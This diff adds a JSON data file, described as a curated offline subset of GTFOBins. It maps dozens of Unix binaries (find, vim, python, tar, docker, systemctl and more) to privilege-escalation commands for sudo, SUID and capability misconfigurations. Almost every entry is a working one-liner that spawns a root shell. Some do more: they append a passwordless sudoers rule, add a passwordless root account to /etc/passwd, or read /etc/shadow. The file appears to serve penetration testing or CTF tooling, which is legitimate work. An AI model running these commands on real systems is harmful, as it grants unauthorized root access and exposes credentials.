@@ -1,0 +1,165 @@
+{
+  "_meta": {
+    "fuente": "GTFOBins (https://gtfobins.github.io/), subset curado y offline",
+    "campos": "sudo / suid / capabilities; en suid usa el binario local (./bin) con bit SUID; en capabilities, cap_setuid+ep"
+  },
+  "find": {
+    "sudo": ["sudo find . -exec /bin/sh \\; -quit"],
+    "suid": ["./find . -exec /bin/sh -p \\; -quit"],
+    "capabilities": ["./find . -exec /bin/sh -p \\; -quit"]
+  },
+  "vim": {
+    "sudo": ["sudo vim -c ':!/bin/sh'"],
+    "suid": ["./vim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"reset; exec sh -p\")'"],
+    "capabilities": ["./vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\",\"-c\",\"reset; exec sh\")'"]
+  },
+  "vi": {
+    "sudo": ["sudo vi -c ':!/bin/sh'"],
+    "suid": ["./vi -c ':!/bin/sh -p' -c ':q!'"]
+  },
+  "nano": {
+    "sudo": ["sudo nano", "  luego: ^R^X  y ejecuta: reset; sh 1>&0 2>&0"]
+  },
+  "less": {
+    "sudo": ["sudo less /etc/profile", "  luego escribe: !/bin/sh"],
+    "suid": ["./less /etc/profile", "  luego: !/bin/sh -p"]
+  },
+  "more": {
+    "sudo": ["TERM= sudo more /etc/profile", "  luego: !/bin/sh"]
+  },
+  "man": {
+    "sudo": ["sudo man man", "  luego: !/bin/sh"]
+  },
+  "awk": {
+    "sudo": ["sudo awk 'BEGIN {system(\"/bin/sh\")}'"],
+    "suid": ["./awk 'BEGIN {system(\"/bin/sh -p\")}'"]
+  },
+  "gawk": {
+    "sudo": ["sudo gawk 'BEGIN {system(\"/bin/sh\")}'"],
+    "suid": ["./gawk 'BEGIN {system(\"/bin/sh -p\")}'"]
+  },
+  "env": {
+    "sudo": ["sudo env /bin/sh"],
+    "suid": ["./env /bin/sh -p"],
+    "capabilities": ["./env /bin/sh -p"]
+  },
+  "bash": {
+    "sudo": ["sudo bash"],
+    "suid": ["./bash -p"]
+  },
+  "sh": {
+    "sudo": ["sudo sh"],
+    "suid": ["./sh -p"]
+  },
+  "python": {
+    "sudo": ["sudo python -c 'import os; os.system(\"/bin/sh\")'"],
+    "suid": ["./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"],
+    "capabilities": ["./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"]
+  },
+  "python3": {
+    "sudo": ["sudo python3 -c 'import os; os.system(\"/bin/sh\")'"],
+    "suid": ["./python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"],
+    "capabilities": ["./python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"]
+  },
+  "perl": {
+    "sudo": ["sudo perl -e 'exec \"/bin/sh\";'"],
+    "suid": ["./perl -e 'exec \"/bin/sh\";'"],
+    "capabilities": ["./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"]
+  },
+  "ruby": {
+    "sudo": ["sudo ruby -e 'exec \"/bin/sh\"'"],
+    "suid": ["./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"],
+    "capabilities": ["./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"]
+  },
+  "php": {
+    "sudo": ["sudo php -r \"system('/bin/sh');\""],
+    "suid": ["./php -r \"pcntl_exec('/bin/sh', ['-p']);\""]
+  },
+  "node": {
+    "sudo": ["sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"],
+    "suid": ["./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"],
+    "capabilities": ["./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"]
+  },
+  "lua": {
+    "sudo": ["sudo lua -e 'os.execute(\"/bin/sh\")'"],
+    "suid": ["./lua -e 'os.execute(\"/bin/sh\")'"]
+  },
+  "nmap": {
+    "sudo": ["TF=$(mktemp); echo 'os.execute(\"/bin/sh\")' > $TF; sudo nmap --script=$TF"],
+    "suid": ["TF=$(mktemp); echo 'os.execute(\"/bin/sh -p\")' > $TF; ./nmap --script=$TF"]
+  },
+  "tar": {
+    "sudo": ["sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"],
+    "suid": ["./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='/bin/sh -p'"]
+  },
+  "zip": {
+    "sudo": ["TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT 'sh #'"],
+    "suid": ["TF=$(mktemp -u); ./zip $TF /etc/hosts -T -TT 'sh -p #'"]
+  },
+  "git": {
+    "sudo": ["sudo git -p help config", "  luego: !/bin/sh", "  (o: sudo git branch --help config; !/bin/sh)"],
+    "suid": ["./git -p help config", "  luego: !/bin/sh -p"]
+  },
+  "docker": {
+    "sudo": ["sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"],
+    "suid": ["docker run -v /:/mnt --rm -it alpine chroot /mnt sh  (si estás en el grupo docker)"]
+  },
+  "tee": {
+    "sudo": ["echo 'tu_usuario ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers"]
+  },
+  "dd": {
+    "suid": ["echo 'data' | ./dd of=/archivo/que/pertenece/a/root  (escritura arbitraria como root)"]
+  },
+  "cp": {
+    "suid": ["LFILE=/etc/passwd; echo 'root2::0:0::/root:/bin/sh' | ./cp /dev/stdin \"$LFILE\"  (añade un root sin contraseña)"]
+  },
+  "make": {
+    "sudo": ["COMMAND='/bin/sh'; sudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\""],
+    "suid": ["COMMAND='/bin/sh -p'; ./make -s --eval=$'x:\\n\\t-'\"$COMMAND\""]
+  },
+  "gdb": {
+    "sudo": ["sudo gdb -nx -ex '!sh' -ex quit"],
+    "suid": ["./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"],
+    "capabilities": ["./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"]
+  },
+  "ftp": {
+    "sudo": ["sudo ftp", "  luego: !/bin/sh"],
+    "suid": ["./ftp", "  luego: !/bin/sh -p"]
+  },
+  "socat": {
+    "sudo": ["sudo socat stdin exec:/bin/sh"]
+  },
+  "ed": {
+    "sudo": ["sudo ed", "  luego: !/bin/sh"]
+  },
+  "sed": {
+    "sudo": ["sudo sed -n '1e exec sh 1>&0' /etc/hosts"]
+  },
+  "wget": {
+    "sudo": ["TF=$(mktemp); chmod +x $TF; echo -e '#!/bin/sh\\n/bin/sh 1>&0' > $TF; sudo wget --use-askpass=$TF 0"]
+  },
+  "curl": {
+    "suid": ["./curl file:///archivo/legible/solo/por/root  (lectura de ficheros como root)"]
+  },
+  "systemctl": {
+    "sudo": ["TF=$(mktemp).service; echo -e '[Service]\\nType=oneshot\\nExecStart=/bin/sh -c \"id > /tmp/out\"\\n[Install]\\nWantedBy=multi-user.target' > $TF; sudo systemctl link $TF; sudo systemctl enable --now $TF"]
+  },
+  "journalctl": {
+    "sudo": ["sudo journalctl", "  luego (si pagina con less): !/bin/sh"]
+  },
+  "mount": {
+    "sudo": ["sudo mount -o bind /bin/sh /bin/mount; sudo mount  (técnica de bind; con cuidado)"]
+  },
+  "mysql": {
+    "sudo": ["sudo mysql -e '\\! /bin/sh'"]
+  },
+  "sqlite3": {
+    "sudo": ["sudo sqlite3 /dev/null '.shell /bin/sh'"]
+  },
+  "base64": {
+    "suid": ["LFILE=/etc/shadow; ./base64 \"$LFILE\" | base64 -d  (lee ficheros como root)"]
+  },
+  "cat": {
+    "suid": ["LFILE=/etc/shadow; ./cat \"$LFILE\"  (lee ficheros como root)"]
+  }
+}
